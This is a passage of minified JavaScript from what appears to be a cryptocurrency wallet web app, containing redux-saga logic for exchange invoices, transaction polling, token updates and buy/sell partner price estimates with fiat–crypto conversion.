            try {
                const {data: t} = await eM.post("/invoice", e);
                return t && "APPROVED" === t.status ? {
                    type: "DUSTER_INVOICE_CREATED_SUCCESSFUL",
                    invoiceId: t.id
                } : {
                    type: "DUSTER_INVOICE_CREATED_ERROR",
                    message: pi
                }
            } catch (t) {
                console.log(t);
                ge.b.error(ge.d.FAILED_REQUEST_DUST, e, t);
                return {
                    type: "DUSTER_INVOICE_CREATED_ERROR",
                    message: pi
                }
            }
        }
        ;
        function *createDusterInvoice(e) {
            yield(0,
            Df.gz)(Fu.setMainPageStep(U4.CREATING_DUSTER_INVOICE));
            const t = yield(0,
            Df.RE)(handleCreateDusterInvoice, e.payload);
            yield(0,
            Df.gz)(Fu.setIsApplyableForDustRequest(!1));
            switch (t.type) {
            case "DUSTER_INVOICE_CREATED_SUCCESSFUL":
                yield(0,
                Df.gz)(Fu.setDusterInvoice(t.invoiceId || ""));
                yield(0,
                Df.gz)(Fu.setMainPageStep(U4.SHOW_CAPTCHA));
                break;
            case "DUSTER_INVOICE_CREATED_ERROR":
                yield(0,
                Df.gz)(Fu.setExchangeError(t.message || ""));
                yield(0,
                Df.gz)(Fu.setMainPageStep(U4.WAIT_FOR_EXCHANGE))
            }
        }
        function *fetchExchangeTransaction(e) {
            yield(0,
            Df.gz)(Fu.resetExchangeStatusToHistory());
            yield(0,
            Df.gz)(Fu.setIsFetchingExchangeUpdateTx(!0));
            const t = 5e3;
            for (; ; ) {
                let a = yield(0,
                Df.Ys)(Hi);
                const n = yield(0,
                Df.Ys)(Ki);
                if (!a || n.includes(di))
                    return;
                const r = yield(0,
                Df.RE)(getExchangeTransactionById, e.payload);
                if ("FETCH_SUCCESS" === r.type) {
                    const {data: e} = r;
                    if (e.id) {
                        yield(0,
                        Df.gz)(Fu.setExchangeTransaction(e));
                        const t = e.status;
                        n.includes(t) || (yield(0,
                        Df.gz)(Fu.addExchangeStatusToHistory(t)))
                    }
                    if (-1 !== ["finished", "expired", "refund", "overdue"].indexOf(e.status))
                        return
                }
                yield(0,
                Df.gw)(t)
            }
        }
        const aue = 864e5;
        function *updateTokensDataOnce() {
            const e = yield(0,
            Df.RE)(fetchFletcherTokens);
            e.length && (yield(0,
            Df.gz)(Fu.setAllTokens({
                tokens: e
            })))
        }
        function *oneTimeTokenInfoUpdate() {
            yield(0,
            Df.$6)([(0,
            Df.gw)(aue), (0,
            Df.RE)(updateTokensDataOnce)])
        }
        function *tokenInfoUpdateCycle() {
            for (; ; )
                yield(0,
                Df.RE)(oneTimeTokenInfoUpdate)
        }
        function *tokenInfoUpdater() {
            yield(0,
            Df.qn)(Fu.initializeTokenInfoUpdater);
            yield(0,
            Df.RE)(tokenInfoUpdateCycle);
            for (; ; )
                yield(0,
                Df.qn)(Fu.initializeTokenInfoUpdater)
        }
        const nue = Jn()((e => {
            var t;
            return Boolean(null === (t = Se.Z.getRootMetadata(e)) || void 0 === t ? void 0 : t.token)
        }
        ))
          , handleCreateExchangeAssetsList = (e, t) => {
            const a = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate)).map((e => (0,
            be.II)(e))).filter((e => Boolean(e)))
              , n = t.filter((e => nue(e.family))).map((e => {
                const {ticker: t, family: a, title: n, contract: r, decimals: l} = e;
                return createFakeToken(t, a, {
                    title: n,
                    smartContract: r,
                    decimals: l
                })
            }
            ))
              , r = undefined;
            return [...a, ...n].filter((t => onCustomFilterWallets(t, [""], {
                exchangesCurrencies: e
            })))
        }
        ;
        function *createExchangeAssets() {
            const e = yield(0,
            Df.Ys)(xi)
              , t = yield(0,
            Df.Ys)(Fi);
            if (0 === e.length || 0 === t.length)
                return;
            const a = yield(0,
            Df.RE)(handleCreateExchangeAssetsList, e, t);
            yield(0,
            Df.gz)(Fu.setExchangeAssetsList(a))
        }
        const rue = 3;
        function *fetchExchangeInfo(e) {
            let t = 0;
            const a = yield(0,
            Df.Ys)(xi);
            yield(0,
            Df.gz)(Fu.setExchangeError(""));
            yield(0,
            Df.gz)(Fu.setFailedFetchEstimate(!1));
            yield(0,
            Df.gz)(Fu.setExchangeInfo({
                estimate: null,
                limits: {},
                isLoading: !0,
                isSupportedPair: !0,
                isError: !1
            }));
            for (; t < 3; ) {
                t += 1;
                const n = yield(0,
                Df.RE)(handleFetchExchangeInfo, {
                    fromWallet: e.payload.fromWallet,
                    toWallet: e.payload.toWallet,
                    amount: e.payload.amount,
                    exchangeCurrencies: a
                })
                  , r = null == n ? void 0 : n.partner;
                r && (yield(0,
                Df.gz)(Fu.setExchangePartner(r)));
                const l = yield(0,
                Df.Ys)($i);
                switch (n.type) {
                case yi:
                    yield(0,
                    Df.gz)(Fu.setExchangeInfo({
                        estimate: n.toAmount,
                        limits: {
                            minimal: n.minAmount,
                            maximal: n.maxAmount
                        },
                        isLoading: !1,
                        isSupportedPair: !0,
                        isError: !1,
                        quotaId: n.quotaId,
                        amountOutMin: n.amountOutMin
                    }));
                    yield(0,
                    Df.gz)(Fu.setFailedFetchEstimate(!1));
                    return;
                case wi:
                    const e = {
                        ...l,
                        estimate: "",
                        isLoading: !1
                    };
                    (n.minAmount || n.maxAmount) && Object.assign(e, {
                        limits: {
                            minimal: n.minAmount,
                            maximal: n.maxAmount
                        }
                    });
                    yield(0,
                    Df.gz)(Fu.setExchangeInfo(e));
                    yield(0,
                    Df.gz)(Fu.setExchangeError(n.error || Ei));
                    return;
                case _i:
                    yield(0,
                    Df.gz)(Fu.setExchangeInfo({
                        ...l,
                        isLoading: !1
                    }));
                    yield(0,
                    Df.gz)(Fu.setExchangeError(hi));
                    return;
                case vi:
                    yield(0,
                    Df.gz)(Fu.setExchangeInfo({
                        ...l,
                        limits: {
                            minimal: n.minAmount,
                            maximal: n.maxAmount
                        }
                    }));
                    return
                }
            }
            const n = yield(0,
            Df.Ys)($i);
            yield(0,
            Df.gz)(Fu.setFailedFetchEstimate(!0));
            yield(0,
            Df.gz)(Fu.setExchangeInfo({
                ...n,
                estimate: "",
                isLoading: !1
            }))
        }
        function *fetchTotalGethBalance_fetchTotalGethBalance() {
            const e = yield(0,
            Df.RE)(fetchTotalGethBalance);
            "code"in e && e.code === G4.OK && e.result && (yield(0,
            Df.gz)(Fu.setTotalGethBalance({
                totalGethBalance: e.result.balance
            })))
        }
        const lue = 3e3;
        function *fetchExchangeCurrenciesList() {
            yield(0,
            Df.P2)(lue, (0,
            te.getType)(Fu.fetchExchangeCurrencies), fetchExchangeCurrencies)
        }
        function *fetchAllTokensList() {
            yield(0,
            Df.ib)((0,
            te.getType)(Fu.fetchAllTokens), fetchAllFletcherTokens)
        }
        function *createTransaction() {
            yield(0,
            Df.ib)((0,
            te.getType)(Fu.createTransaction), createExchangeTransaction_createExchangeTransaction)
        }
        function *createOrderInfoG() {
            yield(0,
            Df.ib)((0,
            te.getType)(Fu.createOrderInfoG), createOrderInfo)
        }
        function *createDusterInvoiceId() {
            yield(0,
            Df.ib)((0,
            te.getType)(Fu.createDusterInvoice), createDusterInvoice)
        }
        function *fetchExchangeTx() {
            yield(0,
            Df.ib)((0,
            te.getType)(Fu.fetchExchangeTransaction), fetchExchangeTransaction)
        }
        function *tokenInfoUpdaterSaga() {
            yield(0,
            Df.Cs)(tokenInfoUpdater)
        }
        function *createExchangeAssetsList() {
            yield(0,
            Df.ib)((0,
            te.getType)(Fu.createExchangeAssetsList), createExchangeAssets)
        }
        function *fetchInfo() {
            yield(0,
            Df.Ds)(300, (0,
            te.getType)(Fu.fetchExchangeInfo), fetchExchangeInfo)
        }
        function *exchangeSaga_fetchTotalGethBalance() {
            yield(0,
            Df.ib)((0,
            te.getType)(Fu.fetchTotalGethBalance), fetchTotalGethBalance_fetchTotalGethBalance)
        }
        const sue = [(0,
        Df.rM)(fetchExchangeCurrenciesList)]
          , iue = [(0,
        Df.rM)(fetchAllTokensList)]
          , oue = [(0,
        Df.rM)(createDusterInvoiceId)]
          , cue = [(0,
        Df.rM)(createTransaction)]
          , uue = [(0,
        Df.rM)(createOrderInfoG)]
          , due = [(0,
        Df.rM)(fetchExchangeTx)]
          , mue = [(0,
        Df.rM)(createExchangeAssetsList)]
          , pue = [(0,
        Df.rM)(tokenInfoUpdaterSaga)]
          , fue = [(0,
        Df.rM)(fetchInfo)]
          , Eue = [(0,
        Df.rM)(exchangeSaga_fetchTotalGethBalance)]
          , getLimits = async e => {
            var t;
            let {side: a, cryptoWallet: n, fiatWallet: r, abortController: l} = e;
            const s = "buy" === a ? null == n ? void 0 : n.currency : r
              , i = "buy" === a ? (null == n ? void 0 : n.family) || (null == n ? void 0 : n.currency) : r
              , o = "buy" === a ? r : null == n ? void 0 : n.currency
              , c = "buy" === a ? r : (null == n ? void 0 : n.family) || (null == n ? void 0 : n.currency)
              , u = Nc.map((async e => {
                const t = undefined;
                return {
                    name: e,
                    limits: await Tc[a][e].limits({
                        paymentCreateTransaction: {
                            currencyTo: s,
                            networkTo: i,
                            networkFrom: c,
                            currencyFrom: o,
                            side: a
                        },
                        abortController: l
                    })
                }
            }
            ))
              , d = null === (t = (await Promise.allSettled(u)).filter((e => "value"in e && "fulfilled" === e.status))) || void 0 === t ? void 0 : t.map((e => null == e ? void 0 : e.value))
              , m = 5
              , p = null == d ? void 0 : d.reduce(( (e, t) => {
                var a, n, r;
                null != t && null !== (a = t.limits) && void 0 !== a && a.max && (0,
                Ko.gt)(null == t || null === (n = t.limits) || void 0 === n ? void 0 : n.max, (null == e ? void 0 : e.max) || 0) && (e.max = (0,
                Ko.FH)(t.limits.max, {
                    min: 0,
                    max: 5
                }));
                if (null != e && e.min && new (Sc())(null == e ? void 0 : e.min).eq(0) || null == e || !e.min || (0,
                Ko.lt)(null == t || null === (r = t.limits) || void 0 === r ? void 0 : r.min, (null == e ? void 0 : e.min) || 0)) {
                    var l;
                    e.min = (0,
                    Ko.FH)(null == t || null === (l = t.limits) || void 0 === l ? void 0 : l.min, {
                        min: 0,
                        max: 5
                    })
                }
                return e
            }
            ), {
                min: null,
                max: null
            })
              , f = undefined;
            return {
                limits: p,
                amountValidateObject: {
                    precision: 5,
                    min: null == p ? void 0 : p.min,
                    max: null == p ? void 0 : p.max,
                    isFullErrorMessage: !0
                }
            }
        }
          , getFilteredWallets = async e => {
            let {wallets: t, tokenList: a, coinList: n, abortController: r} = e;
            const l = undefined
              , s = (await fetchFletcherTokens(r)).filter((e => "pax" !== e.ticker)).reduce(( (e, t) => {
                var n;
                const r = null == t || null === (n = t.family) || void 0 === n ? void 0 : n.toLowerCase();
                if (a && null != a && a[r]) {
                    var l;
                    if (a[r].includes(null == t ? void 0 : t.contract) || a[r].includes((null == t || null === (l = t.contract) || void 0 === l ? void 0 : l.toLowerCase()) || "")) {
                        e[r] || (e[r] = []);
                        e[r].push(getTokenParams(t))
                    }
                }
                return e
            }
            ), {})
              , i = null == t ? void 0 : t.filter((e => {
                var t;
                return !!n && n.includes(null === (t = e.currency) || void 0 === t ? void 0 : t.toLowerCase())
            }
            )).map((e => {
                var t;
                const a = e.clone();
                a.subWallets = null == a || null === (t = a.subWallets) || void 0 === t ? void 0 : t.filter((t => {
                    var a, n, r;
                    return null == s || null === (a = s[(null === (n = e.family) || void 0 === n ? void 0 : n.toLowerCase()) || (null === (r = e.currency) || void 0 === r ? void 0 : r.toLowerCase())]) || void 0 === a ? void 0 : a.some((e => {
                        var a, n;
                        return "bnb" === (null == t ? void 0 : t.family) && ((null == t ? void 0 : t.ticker) || t.currency) === (null == e ? void 0 : e.ticker) || (null == t ? void 0 : t.smartContract) && (null === (a = e.smartContract) || void 0 === a ? void 0 : a.toLowerCase()) === (null == t || null === (n = t.smartContract) || void 0 === n ? void 0 : n.toLowerCase())
                    }
                    ))
                }
                ));
                return a
            }
            ));
            return {
                wallets: i
            }
        }
          , convertFiatToUSD = (e, t, a) => "usd" === t.toLowerCase() ? e.toString() : "0" === String(e) ? "0" : null != a && a[t.toLowerCase()] ? multipliedBy(e, String(a[t.toLowerCase()])).toString() : null
          , convertUSDToFiat = (e, t, a) => {
            if ("usd" === t.toLowerCase())
                return e.toString();
            if ("0" === String(e))
                return "0";
            if (null == a || !a[t.toLowerCase()])
                return null;
            const n = a[t.toLowerCase()];
            return (0,
            Ko.gt)(n, 1) ? (0,
            Ko.$q)(e, String(n)).toString() : (0,
            Ko.hC)(e, String(n)).toString()
        }
          , convertCryptoToFiat = (e, t, a, n) => {
            var r, l;
            if (t.currency === a)
                return String(e);
            if ("0" === String(e))
                return "0";
            if (t.currency.endsWith("-testnet"))
                return null;
            const s = findWalletRate(n, t);
            return s && null != s && null !== (r = s.rates) && void 0 !== r && r[a] ? multipliedBy(e, String(null == s || null === (l = s.rates) || void 0 === l ? void 0 : l[a])).toString() : null
        }
          , convertFiatToCrypto = (e, t, a, n) => {
            if ((0,
            be.uL)(t.currency) === a)
                return String(e);
            if ("0" === String(e))
                return "0";
            const r = (0,
            Cd.w)(n, t);
            if (!r)
                return null;
            const l = (0,
            be.II)((0,
            be.uL)(t.currency))
              , s = t.data && t.data.precision
              , i = l && l.precision ? l.precision : 2
              , o = s || i;
            if (!r.rates[a])
                return null;
            const c = (0,
            Ko.FH)((0,
            Ko.hC)(e, String(r.rates[a])), {
                max: o
            });
            return !c || isNaN(Number(c)) ? "-" : c
        }
          , getEstimate = async e => {
            var t, a, n, r, l, s;
            let {partners: i, fiatWallet: o, cryptoWallet: c, amount: u, side: d, abortController: m} = e;
            const p = {
                simplex: {
                    partner: "simplex"
                },
                guardarian: {
                    partner: "guardarian"
                }
            }
              , f = await filterPartners({
                partners: i,
                fiat: o,
                currency: null == c || null === (t = c.currency) || void 0 === t ? void 0 : t.toUpperCase(),
                family: null == c || null === (a = c.family) || void 0 === a ? void 0 : a.toUpperCase(),
                contract: null !== (n = null == c || null === (r = c.smartContract) || void 0 === r ? void 0 : r.toUpperCase()) && void 0 !== n ? n : null == c || null === (l = c.currency) || void 0 === l ? void 0 : l.toUpperCase()
            });
            if (!f.length)
                return {
                    maxPartner: null,
                    maxEstimate: null,
                    partner: null,
                    estimates: {
                        ...p
                    }
                };
            const E = "buy" === d ? null == c ? void 0 : c.currency : o
              , h = "buy" === d ? (null == c ? void 0 : c.family) || (null == c ? void 0 : c.currency) : o
              , g = "buy" === d ? o : null == c ? void 0 : c.currency
              , y = "buy" === d ? o : (null == c ? void 0 : c.family) || (null == c ? void 0 : c.currency)
              , v = f.map((async e => Tc[d][e].estimate({
                paymentCreateTransaction: {
                    smartContract: c.smartContract || "",
                    amount: u,
                    currencyTo: E,
                    networkTo: h,
                    currencyFrom: g,
                    networkFrom: y,
                    side: d
                },
                abortController: m
            })))
              , _ = null === (s = (await Promise.allSettled(v)).filter((e => {
                var t;
                return "value"in e && "fulfilled" === e.status && (null == e || null === (t = e.value) || void 0 === t ? void 0 : t.estimate)
            }
            ))) || void 0 === s ? void 0 : s.map((e => null == e ? void 0 : e.value))
              , w = null == _ ? void 0 : _.map((e => ({
                ...e,
                estimate: (0,
                Ko.FH)(null == e ? void 0 : e.estimate, {
                    min: 0,
                    max: 5
                })
            })))
              , b = (0,
            xd.Z)((e => null == e ? void 0 : e.partner), w);
            let k = null
              , S = null;
            w.forEach((e => {
                var t;
                if (null != e && e.estimate && Number(null == e ? void 0 : e.estimate) > Number((null === (t = k) || void 0 === t ? void 0 : t.estimate) || 0)) {
                    k = e;
                    S = e.partner
                }
            }
            ));
            return {
                maxPartner: S,
                maxEstimate: k,
                partner: S,
                estimates: {
                    ...p,
                    ...b
                }
            }
        }
          , getFiatAmountWithEstimate = e => {
            let {side: t, amount: a, estimate: n, isErrorPartners: r} = e;
            return "buy" === t ? (0,
            Ko.FH)(a, {
                min: 0,
                max: 0
            }) || "-" : "sell" === t ? r ? "-" : (0,
            Ko.FH)(n, {
                min: 0,
                max: 2
            }) || "-" : "-"
        }
          , getCryptoAmountWithEstimate = e => {
            let {side: t, estimate: a, isErrorPartners: n, precision: r, convertedDefaultAmountInUSD: l} = e;
            return "buy" === t ? n ? "-" : a && "-" !== a ? (0,
            Ko.gt)(String(a).replace(/\.\d+/, "").length, 12) ? new (Sc())(a).toFormat(0) : (0,
            Ko.FH)(a, {
                min: 0,
                max: r || 5
            }) || "-" : "-" : "sell" === t && l ? (0,
            Ko.FH)(l, {
                min: 0,
                max: r || 5
            }) : "-"
        }
          , toFixedAmount = e => (0,
        Ko.FH)(e, {
            min: 0,
            max: 5
        });
        function *initGetCurrenciesApi(e) {
            var t;
            let {side: a, abortController: n} = e;
            const {isLoadingGetCurrencies: r} = yield(0,
            Df.Ys)(jO);
            if (r)
                return;
            const {fiatList: l, coinList: s, tokenList: i, partners: o} = yield(0,
            Df.Ys)($O);
            if (null != l && l.length && null !== (t = Object.keys(i)) && void 0 !== t && t.length && null != s && s.length && null != o && o.length)
                return;
            yield(0,
            Df.gz)(_O.setIsLoadingGetCurrencies(!0));
            const {coinList: c, tokenList: u, fiatList: d, partners: m} = yield(0,
            Df.RE)(getCurrencies, {
                side: a,
                abortController: n
            });
            yield(0,
            Df.gz)(_O.getCurrenciesCommit({
                coinList: c,
                tokenList: u,
                fiatList: d,
                partners: m
            }));
            yield(0,
            Df.gz)(_O.setIsLoadingGetCurrencies(!1))
        }
        function *initGetCurrenciesCase(e) {
            const {side: t, abortController: a} = e.payload;
            yield initGetCurrenciesApi({
                side: t,
                abortController: a
            })
        }
        function *fetchPartnersCase(e) {
            var t, a;
            const n = yield(0,
            Df.Ys)(Bo)
              , r = null !== (t = null == e || null === (a = e.payload) || void 0 === a ? void 0 : a.force) && void 0 !== t && t;
            if (!0 !== n || !1 !== r)
                try {
                    var l, s, i, o, c, u, d, m, p, f, E, h, g, y, v, _;
                    yield(0,
                    Df.gz)(_O.errorCheckCommit(!1));
                    yield(0,
                    Df.gz)(_O.changeCryptoAmount(""));
                    null != e && null !== (l = e.payload) && void 0 !== l && l.force && (yield(0,
                    Df.gz)(_O.fetchPartnersIsLoading(!1)));
                    const t = undefined;
                    if (yield(0,
                    Df.Ys)(FO))
                        return;
                    yield(0,
                    Df.gz)(_O.fetchPartnersIsLoading(!0));
                    const a = yield(0,
                    Df.Ys)(kd.Dn);
                    let n = yield(0,
                    Df.Ys)(kd.Y2);
                    const r = yield(0,
                    Df.Ys)(wO)
                      , R = getLocationParams();
                    yield initGetCurrenciesApi({
                        side: r,
                        abortController: e.payload.abortController
                    });
                    const {fiatList: B, coinList: O, tokenList: D, partners: M} = yield(0,
                    Df.Ys)($O)
                      , U = yield(0,
                    Df.Ys)(Sd.selectedLocalCurrency)
                      , G = yield(0,
                    Df.Ys)(bO);
                    let V;
                    if (G)
                        V = G;
                    else if (null != R && R.fiat)
                        V = R.fiat;
                    else {
                        const e = undefined;
                        V = "sell" !== r || isSellFiatSupported(U) ? U : dS.H[0].ticker
                    }
                    const K = (0,
                    Ko.FH)(null != R && R.amount ? R.amount : convertUSDToFiat(x4, V, a) || String(x4), {
                        min: 0,
                        max: 0
                    })
                      , H = "buy" === r ? yield(0,
                    Df.Ys)($c) : yield(0,
                    Df.Ys)(Zc);
                    let z = null != R && R.walletTo ? yield(0,
                    Df.Ys)((e => eu(e)(R.walletTo))) : yield(0,
                    Df.Ys)(tu);
                    null !== (s = z) && void 0 !== s && s.currency || (z = null == H ? void 0 : H[0]);
                    if (null !== (i = z) && void 0 !== i && i.uuid) {
                        var w;
                        yield(0,
                        Df.gz)(Xu({
                            activeWalletId: null === (w = z) || void 0 === w ? void 0 : w.uuid
                        }))
                    }
                    const {wallets: j} = yield(0,
                    Df.RE)(getFilteredWallets, {
                        wallets: H,
                        tokenList: D,
                        coinList: O,
                        abortController: null == e || null === (o = e.payload) || void 0 === o ? void 0 : o.abortController
                    });
                    yield(0,
                    Df.gz)(_O.fetchPartnersCommit({
                        partners: M,
                        coinList: O,
                        tokenList: D,
                        fiatList: B,
                        fiatWallet: V,
                        wallets: j
                    }));
                    let $ = null;
                    if (z) {
                        var b, k, S, C, N, T, A, x;
                        const e = undefined;
                        ((null == D || null === (b = D[(null === (k = z) || void 0 === k ? void 0 : k.family) || (null === (S = z) || void 0 === S ? void 0 : S.currency)]) || void 0 === b ? void 0 : b.includes(null === (C = z) || void 0 === C || null === (N = C.smartContract) || void 0 === N ? void 0 : N.toLowerCase())) || "BNB_TOKEN_SUBWALLET" === (null === (T = z) || void 0 === T ? void 0 : T.type) || (null == O ? void 0 : O.includes((null === (A = z) || void 0 === A ? void 0 : A.currency) || (null === (x = z) || void 0 === x ? void 0 : x.ticker) || ""))) && ($ = z)
                    }
                    $ || ($ = (null == j ? void 0 : j.find((e => ["btc", "eth"].includes(null == e ? void 0 : e.currency)))) || (null == j ? void 0 : j[0]));
                    const Z = yield(0,
                    Df.RE)(getLimits, {
                        side: r,
                        cryptoWallet: $,
                        fiatWallet: V,
                        abortController: e.payload.abortController
                    });
                    if (!Z) {
                        yield(0,
                        Df.gz)(_O.fetchPartnersIsError(!0));
                        return
                    }
                    yield(0,
                    Df.gz)(_O.fetchPartnersCommit({
                        wallets: j,
                        side: r,
                        ...Z ? {
                            limits: Z
                        } : {},
                        ...$ ? {
                            cryptoWallet: $
                        } : {}
                    }));
                    if (null === (c = Object.keys(n)) || void 0 === c || !c.length) {
                        yield(0,
                        Df.RE)(C_.CA);
                        n = yield(0,
                        Df.Ys)(kd.Y2)
                    }
                    const Y = convertFiatToCrypto(x4, z, V, n)
                      , q = toFixedAmount(Y || "");
                    let X = (0,
                    Ko.FH)(null != R && R.amount ? R.amount : isNaN(Number(q)) ? "-" : q || "-", {
                        min: 0,
                        max: 5
                    });
                    if ((0,
                    Ko.gt)(X, null === (u = z) || void 0 === u ? void 0 : u.balance)) {
                        var I, P;
                        X = null !== (I = z) && void 0 !== I && I.balance ? (0,
                        Ko.FH)(null === (P = z) || void 0 === P ? void 0 : P.balance, {
                            min: 0,
                            max: 5
                        }) : "-"
                    }
                    const Q = toFixedAmount(("buy" === r ? convertUSDToFiat(A4, V, a) : convertFiatToCrypto(A4, z, "usd", n)) || "");
                    if ("buy" === r) {
                        const e = !K || isNaN(Number(K)) ? "-" : K;
                        yield(0,
                        Df.gz)(_O.changeFiatAmount(e))
                    }
                    if ("sell" === r) {
                        const e = !X || isNaN(Number(X)) ? "-" : X;
                        yield(0,
                        Df.gz)(_O.changeCryptoAmount(e))
                    }
                    const J = {
                        side: r,
                        amount: "buy" === r ? Number(K) || 0 : Number(X),
                        currencyTo: "buy" === r ? (null === (d = $) || void 0 === d ? void 0 : d.currency) || "btc" : V,
                        networkTo: "buy" === r ? (null === (m = $) || void 0 === m ? void 0 : m.family) || (null === (p = $) || void 0 === p ? void 0 : p.currency) || "btc" : V,
                        currencyFrom: "buy" === r ? V : (null === (f = $) || void 0 === f ? void 0 : f.currency) || "btc",
                        networkFrom: "buy" === r ? V : (null === (E = $) || void 0 === E ? void 0 : E.family) || (null === (h = $) || void 0 === h ? void 0 : h.currency) || "btc",
                        ..."buy" === r ? {
                            payoutAddress: (null === (g = $) || void 0 === g ? void 0 : g.accountName) || (null === (y = $) || void 0 === y ? void 0 : y.address)
                        } : {}
                    };
                    if ((0,
                    Ko.lt)(null == J ? void 0 : J.amount, Z.limits.min)) {
                        yield(0,
                        Df.gz)(_O.fetchPartnersIsError(!0));
                        yield(0,
                        Df.gz)(_O.fetchPartnersIsLoading(!1));
                        return
                    }
                    const ee = yield(0,
                    Df.RE)(getEstimate, {
                        partners: M,
                        fiatWallet: V,
                        cryptoWallet: $,
                        amount: null == J ? void 0 : J.amount,
                        side: r,
                        abortController: e.payload.abortController
                    });
                    if (null != ee && null !== (v = ee.maxEstimate) && void 0 !== v && v.estimate || null != Z && null !== (_ = Z.amountValidateObject) && void 0 !== _ && _.precision) {
                        var L, F, W;
                        const e = getFiatAmountWithEstimate({
                            side: r,
                            amount: K,
                            estimate: (null == ee || null === (L = ee.maxEstimate) || void 0 === L ? void 0 : L.estimate) || "0",
                            isErrorPartners: !1
                        })
                          , t = getCryptoAmountWithEstimate({
                            side: r,
                            amount: K,
                            estimate: (null == ee || null === (F = ee.maxEstimate) || void 0 === F ? void 0 : F.estimate) || "0",
                            isErrorPartners: !1,
                            precision: (null == Z || null === (W = Z.amountValidateObject) || void 0 === W ? void 0 : W.precision) || 0,
                            convertedDefaultAmountInUSD: X
                        })
                          , a = {
                            partners: M,
                            coinList: O,
                            tokenList: D,
                            fiatList: B,
                            fiatAmount: e,
                            cryptoAmount: isNaN(Number(t)) ? "—" : t,
                            fiatWallet: V,
                            paymentCreateTransaction: J,
                            optimalPurchase: Q,
                            limits: Z,
                            ...ee
                        };
                        yield(0,
                        Df.gz)(_O.fetchPartnersCommit(a))
                    }
                    yield(0,
                    Df.gz)(_O.fetchPartnersIsLoading(!1));
                    yield(0,
                    Df.gz)(_O.fetchPartnersIsError(!1))
                } catch (e) {
                    console.error("e", e);
                    yield(0,
                    Df.gz)(_O.fetchPartnersIsError(!0));
                    yield(0,
                    Df.gz)(_O.fetchPartnersIsLoading(!1))
                }
        }
        function *changeFiatWalletCase(e) {
            const t = e.payload.fiatWallet;
            yield(0,
            Df.gz)(_O.changeFiatWalletCommit(t));
            const a = yield(0,
            Df.Ys)(wO)
              , n = yield(0,
            Df.Ys)(tu)
              , r = yield(0,
            Df.RE)(getLimits, {
                side: a,
                cryptoWallet: n,
                fiatWallet: t,
                abortController: e.payload.abortController
            });
            yield(0,
            Df.gz)(_O.setLimitsCommit({
                limits: r
            }));
            const l = yield(0,
            Df.Ys)(kd.Dn)
              , s = toFixedAmount(convertUSDToFiat(x4, t, l) || String(x4));
            yield(0,
            Df.gz)(_O.changeFiatAmount(s));
            const i = yield(0,
            Df.Ys)(kd.Y2)
              , o = toFixedAmount("buy" === a ? convertUSDToFiat(A4, t, l) || String(A4) : convertFiatToCrypto(A4, n, "usd", i) || String(A4));
            yield(0,
            Df.gz)(_O.setOptimalPurchase(o));
            yield(0,
            Df.gz)(_O.fetchEstimate({
                abortController: e.payload.abortController
            }));
            const c = yield(0,
            Df.Ys)(kO);
            yield(0,
            Df.gz)(_O.setPaymentCreateTransaction({
                side: a,
                amount: "buy" === a ? Number(s) || 0 : Number(c),
                currencyTo: "buy" === a ? (null == n ? void 0 : n.currency) || "btc" : t,
                networkTo: "buy" === a ? (null == n ? void 0 : n.family) || (null == n ? void 0 : n.currency) || "btc" : t,
                currencyFrom: "buy" === a ? t : (null == n ? void 0 : n.currency) || "btc",
                networkFrom: "buy" === a ? t : (null == n ? void 0 : n.family) || (null == n ? void 0 : n.currency) || "btc",
                ..."buy" === a ? {
                    payoutAddress: (null == n ? void 0 : n.accountName) || (null == n ? void 0 : n.address)
                } : {}
            }))
        }
        function *changeCryptoWalletCase(e) {
            var t;
            const a = e.payload.cryptoWallet;
            null != a && a.uuid && (yield(0,
            Df.gz)(Xu({
                activeWalletId: null == a ? void 0 : a.uuid
            })));
            const n = yield(0,
            Df.Ys)(wO)
              , r = yield(0,
            Df.Ys)(bO)
              , l = yield(0,
            Df.RE)(getLimits, {
                side: n,
                cryptoWallet: a,
                fiatWallet: r,
                abortController: null == e || null === (t = e.payload) || void 0 === t ? void 0 : t.abortController
            });
            yield(0,
            Df.gz)(_O.setLimitsCommit({
                limits: l
            }));
            const s = yield(0,
            Df.Ys)(kd.Y2);
            let i = toFixedAmount(convertFiatToCrypto(A4, a, "usd", s) || String(A4));
            (0,
            Ko.gt)(i, null == a ? void 0 : a.balance) && (i = null != a && a.balance ? (0,
            Ko.FH)(null == a ? void 0 : a.balance, {
                min: 0,
                max: 5
            }) : "-");
            yield(0,
            Df.gz)(_O.changeCryptoAmount(i));
            const o = yield(0,
            Df.Ys)(kd.Dn)
              , c = toFixedAmount("buy" === n ? convertUSDToFiat(A4, r, o) || String(A4) : convertFiatToCrypto(A4, a, "usd", s) || String(A4));
            yield(0,
            Df.gz)(_O.setOptimalPurchase(c));
            yield(0,
            Df.gz)(_O.fetchEstimate({
                abortController: e.payload.abortController
            }));
            const u = yield(0,
            Df.Ys)(SO);
            yield(0,
            Df.gz)(_O.setPaymentCreateTransaction({
                side: n,
                amount: "buy" === n ? Number(u) || 0 : Number(i),
                currencyTo: "buy" === n ? (null == a ? void 0 : a.currency) || "btc" : r,
                networkTo: "buy" === n ? (null == a ? void 0 : a.family) || (null == a ? void 0 : a.currency) || "btc" : r,
                currencyFrom: "buy" === n ? r : (null == a ? void 0 : a.currency) || "btc",
                networkFrom: "buy" === n ? r : (null == a ? void 0 : a.family) || (null == a ? void 0 : a.currency) || "btc",
                ..."buy" === n ? {
                    payoutAddress: (null == a ? void 0 : a.accountName) || (null == a ? void 0 : a.address)
                } : {}
            }))
        }
        function *fetchEstimateCase(e) {
            yield(0,
            Df.gz)(_O.fetchPartnersIsLoading(!0));
            const t = yield(0,
            Df.Ys)(wO)
              , a = yield(0,
            Df.Ys)(WO)
              , n = yield(0,
            Df.Ys)(bO)
              , r = yield(0,
            Df.Ys)(tu)
              , l = yield(0,
            Df.Ys)(SO)
              , s = yield(0,
            Df.Ys)(kO)
              , i = "buy" === t ? l : s;
            if (r) {
                const l = {
                    partners: a,
                    fiatWallet: n,
                    cryptoWallet: r,
                    amount: Number(i),
                    side: t,
                    abortController: e.payload.abortController
                }
                  , s = yield(0,
                Df.RE)(getEstimate, l);
                if (null != s && s.partner) {
                    yield(0,
                    Df.gz)(_O.fetchPartnersIsError(!1));
                    if ("buy" === t) {
                        var o;
                        const e = getCryptoAmountWithEstimate({
                            side: t,
                            amount: i,
                            estimate: (null == s || null === (o = s.maxEstimate) || void 0 === o ? void 0 : o.estimate) || "0",
                            isErrorPartners: !1,
                            precision: 5,
                            convertedDefaultAmountInUSD: "0"
                        });
                        yield(0,
                        Df.gz)(_O.changeCryptoAmount(e))
                    }
                    if ("sell" === t) {
